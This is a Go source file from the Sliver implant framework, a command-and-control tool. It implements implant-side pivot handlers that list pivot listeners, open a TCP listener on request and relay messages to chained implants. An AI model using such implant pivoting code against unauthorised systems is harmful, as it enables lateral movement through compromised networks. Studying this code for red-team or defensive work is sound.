// +build windows linux darwin

package handlers

/*
  Sliver Implant Framework
  Copyright (C) 2019  Bishop Fox

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/pivots"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	genericPivotHandlers = map[uint32]PivotHandler{
		sliverpb.MsgPivotData:    pivotDataHandler,
		sliverpb.MsgTCPPivotReq:  tcpListenerHandler,
		sliverpb.MsgPivotListReq: pivotListHandler,
	}
)

// GetPivotHandlers - Returns a map of pivot handlers
func GetPivotHandlers() map[uint32]PivotHandler {
	return genericPivotHandlers
}

func pivotListHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	listReq := &sliverpb.PivotListReq{}
	listResp := &sliverpb.PivotList{
		Response: &commonpb.Response{},
	}
	err := proto.Unmarshal(envelope.Data, listReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		listResp.Response.Err = err.Error()
		data, _ := proto.Marshal(listResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.ID,
			Data: data,
		}
		return
	}
	listeners := pivots.GetListeners()
	entries := make([]*sliverpb.PivotEntry, 0)
	for _, entry := range listeners {
		entries = append(entries, &sliverpb.PivotEntry{
			Type:   entry.Type,
			Remote: entry.RemoteAddress,
		})
	}
	listResp.Entries = entries
	data, _ := proto.Marshal(listResp)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: data,
	}
}

func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	tcpPivot := &sliverpb.TCPPivotReq{}
	err := proto.Unmarshal(envelope.Data, tcpPivot)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		tcpPivotResp := &sliverpb.TCPPivot{
			Success:  false,
			Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(tcpPivotResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	err = pivots.StartTCPListener(tcpPivot.Address)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		tcpPivotResp := &sliverpb.TCPPivot{
			Success:  false,
			Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(tcpPivotResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	tcpResp := &sliverpb.TCPPivot{
		Success: true,
	}
	data, _ := proto.Marshal(tcpResp)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

func pivotDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	pivData := &sliverpb.PivotData{}
	proto.Unmarshal(envelope.Data, pivData)

	origData := &sliverpb.Envelope{}
	proto.Unmarshal(pivData.Data, origData)

	pivotConn := pivots.Pivot(pivData.GetPivotID())
	if pivotConn != nil {
		pivots.PivotWriteEnvelope(pivotConn, origData)
	} else {
		// {{if .Config.Debug}}
		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
		// {{end}}
	}
}
